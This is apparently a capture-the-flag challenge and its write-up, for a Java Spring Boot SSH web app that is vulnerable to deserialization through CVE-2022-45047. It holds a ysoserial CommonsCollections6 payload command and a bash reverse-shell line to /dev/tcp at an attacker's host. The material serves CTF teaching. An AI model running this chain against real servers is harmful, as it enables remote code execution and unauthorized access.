## 題目名稱

SSH-connector

## 題目類型

Web

## 題目說明

BRIdGE developed a web app which uses SSH protocol to connect to remote server. He then can connect to his VPS and run commands using only browsers.

He connects to his VPS on his smart phone, TV and even Apple Watch. But someday, someone connects to BRIdGE's own machine...

## Challenge Deployment

`docker build -t ssh-connector .`

`docker run -id -p 8088:8080 --name ssh-connector ssh-connector`

This is a white-box challenge. So remember to give challengers the docker files.

## Write-Up

The app is a springboot application. Use java decompile tools like jd-gui to reveal the jar file. Locating the pom.xml, and the app uses the below dependency to handle SSH connections.

```xml
<dependency>
    <groupId>org.apache.sshd</groupId>
    <artifactId>sshd-core</artifactId>
    <version>2.9.1</version>
</dependency>
```

This version of Apache MINA SSHD is exploitable with CVE-2022-45047. 

Look deep into the source code. Users can upload an arbitrary private key file to `/app/files` . And the file will be load as a KeyPair object, before serialized to a `.ser` file. While connecting to the remote server, the `.ser` file will be deserialized and be passed to the provider `SimpleGeneratorHostKeyProvider`.The KeyPair path of `SimpleGeneratorHostKeyProvider` is controllable by users, so users can provide dangerous serialized data.

On the other hand, the app has a dependency

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

which leads to arbitrary code execution when being deserialized.

Use [ysoserial](https://github.com/frohoff/ysoserial) to craft the serialized data.

`java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,xxx}|{base64,-d}|{bash,-i}' > rev_shell.ser`

Note that `xxx` is the base64 encoded data of

`bash -c 'bash -i >& /dev/tcp/[attacker's VPS ip]/[attacker's VPS port] 0>&1'`

And upload `rev_shell.ser ` , and then connect to any server using the returned private key path. The attacker's VPS will then receive a reverse shell. Finally run `/readflag` to get the flag.